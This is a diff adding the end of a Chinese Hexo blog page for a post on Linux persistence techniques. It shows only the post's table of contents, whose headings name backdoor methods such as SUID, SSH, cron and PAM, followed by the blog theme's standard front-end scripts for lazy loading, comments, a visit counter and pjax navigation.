+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E7%BB%88%E7%AB%AF%E5%B1%9E%E6%80%A7"><span class="toc-text">修改文件&#x2F;终端属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%97%B6%E9%97%B4"><span class="toc-text">1. 文件创建时间</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E9%94%81%E5%AE%9A"><span class="toc-text">2. 文件锁定</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%8E%86%E5%8F%B2%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4"><span class="toc-text">3. 历史操作命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-passwd%E5%86%99%E5%85%A5"><span class="toc-text">4. passwd写入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID%E5%90%8E%E9%97%A8"><span class="toc-text">SUID后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LKM-Linux-rootkit%E5%90%8E%E9%97%A8"><span class="toc-text">LKM Linux rootkit后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-%E5%90%8E%E9%97%A8"><span class="toc-text">SSH 后门</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-SSH-wrapper"><span class="toc-text">1. SSH wrapper</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-SSH-%E8%BD%AF%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8"><span class="toc-text">2. SSH 软连接后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-SSH-%E5%85%AC%E9%92%A5%E5%85%8D%E5%AF%86%E7%99%BB%E9%99%86"><span class="toc-text">3. SSH 公钥免密登陆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-SSH-Keylogger%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81"><span class="toc-text">4. SSH Keylogger记录密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-strace%E7%9B%91%E5%90%ACssh%E6%9D%A5%E6%BA%90%E6%B5%81%E9%87%8F"><span class="toc-text">5. strace监听ssh来源流量</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cron%E5%90%8E%E9%97%A8"><span class="toc-text">Cron后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cat%E9%9A%90%E8%97%8F"><span class="toc-text">Cat隐藏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vim%E5%90%8E%E9%97%A8"><span class="toc-text">Vim后门</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-vim-modeline-CVE-2019-12735"><span class="toc-text">1. vim modeline(CVE-2019-12735)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-vim-python-%E6%89%A9%E5%B1%95%E5%90%8E%E9%97%A8"><span class="toc-text">2. vim python 扩展后门</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inetd%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-text">inetd服务后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%90%8E%E9%97%A8"><span class="toc-text">协议后门</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ICMP"><span class="toc-text">ICMP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS"><span class="toc-text">DNS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PAM%E5%90%8E%E9%97%A8"><span class="toc-text">PAM后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">进程注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rootkit"><span class="toc-text">Rootkit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap-nse%E5%90%8E%E9%97%A8"><span class="toc-text">nmap nse后门</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+        
+        
+          <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.postTitle="Linux 权限维持整理";
+  pdata.commentPath="";
+  pdata.commentPlaceholder="";
+
+  var l_header=document.getElementById("l_header");
+  
+  l_header.classList.add("show");
+  
+</script>
+
+        
+      </div>
+      
+  
+  <footer class="footer clearfix">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+
+        </div>
+      
+    
+      
+        
+          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
+</div>
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2020-2021 cances</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+      <a id="s-top" class="fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+    </div>
+  </div>
+  <div>
+    <script>
+window.volantis={};
+window.volantis.loadcss=document.getElementById("loadcss");
+/********************脚本懒加载函数********************************/
+function loadScript(src, cb) {
+var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+var script = document.createElement('script');
+script.setAttribute('type','text/javascript');
+if (cb) script.onload = cb;
+script.setAttribute('src', src);
+HEAD.appendChild(script);
+}
+//https://github.com/filamentgroup/loadCSS
+var loadCSS = function( href, before, media, attributes ){
+	var doc = window.document;
+	var ss = doc.createElement( "link" );
+	var ref;
+	if( before ){
+		ref = before;
+	}
+	else {
+		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
+		ref = refs[ refs.length - 1];
+	}
+	var sheets = doc.styleSheets;
+	if( attributes ){
+		for( var attributeName in attributes ){
+			if( attributes.hasOwnProperty( attributeName ) ){
+				ss.setAttribute( attributeName, attributes[attributeName] );
+			}
+		}
+	}
+	ss.rel = "stylesheet";
+	ss.href = href;
+	ss.media = "only x";
+	function ready( cb ){
+		if( doc.body ){
+			return cb();
+		}
+		setTimeout(function(){
+			ready( cb );
+		});
+	}
+	ready( function(){
+		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
+	});
+	var onloadcssdefined = function( cb ){
+		var resolvedHref = ss.href;
+		var i = sheets.length;
+		while( i-- ){
+			if( sheets[ i ].href === resolvedHref ){
+				return cb();
+			}
+		}
+		setTimeout(function() {
+			onloadcssdefined( cb );
+		});
+	};
+	function loadCB(){
+		if( ss.addEventListener ){
+			ss.removeEventListener( "load", loadCB );
+		}
+		ss.media = media || "all";
+	}
+	if( ss.addEventListener ){
+		ss.addEventListener( "load", loadCB);
+	}
+	ss.onloadcssdefined = onloadcssdefined;
+	onloadcssdefined( loadCB );
+	return ss;
+};
+</script>
+<script>
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
+  
+  
+  
+  
+</script>
+<!-- required -->
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+<script>
+  function pjax_fancybox() {
+    $(".md .gallery").find("img").each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".md .gallery").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  function SCload_fancybox() {
+    if ($(".md .gallery").find("img").length == 0) return;
+    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
+    setTimeout(function() {
+      loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
+    }, 1);
+  };
+  $(function () {
+    SCload_fancybox();
+  });
+</script>
+
+
+<!-- internal -->
+
+
+
+
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+  
+    <script>
+      window.FPConfig = {
+        delay: 0,
+        ignoreKeywords: [],
+        maxRPS: 5,
+        hoverDelay: 25
+      };
+    </script>
+    <script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  <script>
+  function load_minivaline() {
+	setTimeout(function() {
+	
+	  loadScript('https://cdn.jsdelivr.net/npm/minivaline@latest', pjax_minivaline)
+	
+	}, 1);
+  };
+  function pjax_minivaline() {
+  if(!document.querySelectorAll("#minivaline_container")[0])return;
+  let pagePlaceholder = pdata.commentPlaceholder || "快来评论吧~";
+  let path = pdata.commentPath;
+  if (path.length == 0) {
+    let defaultPath = '';
+    path = defaultPath || decodeURI(window.location.pathname);
+  }
+    new MiniValine(Object.assign({"js":"https://cdn.jsdelivr.net/npm/minivaline@latest","path":null,"placeholder":"快来评论吧~","appId":"iMSDAhwqPtIXRIwD5jV5GD1P-MdYXbMMI","appKey":"xOK2meC6n8rsbW46wbFbCtLq"}, {
+	  el: '#minivaline_container',
+	  pathname: path,
+	  placeholder: pagePlaceholder,
+    }));
+  }
+  $(function () {
+    if(!document.querySelectorAll("#minivaline_container")[0])return;
+    load_minivaline();
+  });
+</script>
+
+
+
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+<!-- optional -->
+
+  <script>
+const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
+const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
+
+$('.input.u-search-input').one('focus',function(){
+	
+		loadScript('/js/search/hexo.js',setSearchService);
+	
+})
+
+function listenSearch(){
+  
+    customSearch = new HexoSearch({
+      imagePath: SearchServiceimagePath
+    });
+  
+}
+function setSearchService() {
+	listenSearch();
+	
+		document.addEventListener("pjax:success", listenSearch);
+	
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'u9j57bwJod4EDmXWdxrwuqQT-MdYXbMMI',
+    app_key: 'jfHtEKVE24j0IVCGHbvuFClp',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://canc3s.github.io' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://canc3s.github.io' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://canc3s.github.io' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
+
+
+
+
+
+
+<script>
+function listennSidebarTOC() {
+  const navItems = document.querySelectorAll(".toc li");
+  if (!navItems.length) return;
+  const sections = [...navItems].map((element) => {
+    const link = element.querySelector(".toc-link");
+    const target = document.getElementById(
+      decodeURI(link.getAttribute("href")).replace("#", "")
+    );
+    link.addEventListener("click", (event) => {
+      event.preventDefault();
+      window.scrollTo({
+		top: target.offsetTop + 100,
+		
+		behavior: "smooth"
+		
+	  });
+    });
+    return target;
+  });
+
+  function activateNavByIndex(target) {
+    if (target.classList.contains("active-current")) return;
+
+    document.querySelectorAll(".toc .active").forEach((element) => {
+      element.classList.remove("active", "active-current");
+    });
+    target.classList.add("active", "active-current");
+    let parent = target.parentNode;
+    while (!parent.matches(".toc")) {
+      if (parent.matches("li")) parent.classList.add("active");
+      parent = parent.parentNode;
+    }
+  }
+
+  function findIndex(entries) {
+    let index = 0;
+    let entry = entries[index];
+    if (entry.boundingClientRect.top > 0) {
+      index = sections.indexOf(entry.target);
+      return index === 0 ? 0 : index - 1;
+    }
+    for (; index < entries.length; index++) {
+      if (entries[index].boundingClientRect.top <= 0) {
+        entry = entries[index];
+      } else {
+        return sections.indexOf(entry.target);
+      }
+    }
+    return sections.indexOf(entry.target);
+  }
+
+  function createIntersectionObserver(marginTop) {
+    marginTop = Math.floor(marginTop + 10000);
+    let intersectionObserver = new IntersectionObserver(
+      (entries, observe) => {
+        let scrollHeight = document.documentElement.scrollHeight + 100;
+        if (scrollHeight > marginTop) {
+          observe.disconnect();
+          createIntersectionObserver(scrollHeight);
+          return;
+        }
+        let index = findIndex(entries);
+        activateNavByIndex(navItems[index]);
+      },
+      {
+        rootMargin: marginTop + "px 0px -100% 0px",
+        threshold: 0,
+      }
+    );
+    sections.forEach((element) => {
+      element && intersectionObserver.observe(element);
+    });
+  }
+  createIntersectionObserver(document.documentElement.scrollHeight);
+}
+
+document.addEventListener("DOMContentLoaded", listennSidebarTOC);
+document.addEventListener("pjax:success", listennSidebarTOC);
+</script>
+
+<!-- more -->
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#l_cover",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      if (typeof $.fancybox != "undefined") {
+        $.fancybox.close();    // 关闭弹窗
+      }
+      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
+      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      volantis.$topBtn.unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+	  
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+       
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+	 
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+      try{
+          if (typeof $.fancybox == "undefined") {
+            SCload_fancybox();
+          } else {
+            pjax_fancybox();
+          }
+        
+        
+        
+        
+        
+        
+        
+          if (typeof MiniValine == "undefined") {
+            load_minivaline();
+          } else {
+            pjax_minivaline();
+          }
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+	  
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+	  
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
